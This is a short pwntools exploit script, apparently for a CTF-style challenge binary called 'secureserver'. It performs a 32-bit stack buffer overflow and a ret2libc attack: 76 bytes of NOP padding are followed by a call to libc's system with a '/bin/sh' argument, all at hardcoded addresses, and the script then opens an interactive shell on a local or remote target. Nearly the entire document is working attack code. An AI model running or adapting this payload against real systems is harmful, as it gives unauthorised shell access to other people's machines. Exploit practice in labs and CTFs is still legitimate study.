from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './secureserver'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

padding = 76
libc_base = 0xf7d62000
binsh = 0xf7f29dd2
# binsh = libc_base + 0x1c7dd2
system = libc_base + 0x53660

payload = flat(
    asm('nop') * padding,
    # binsh,
    # 0x0,
    system,
    0x0,
    # binsh,
    binsh
)

io.sendlineafter(b':', payload)

io.interactive()

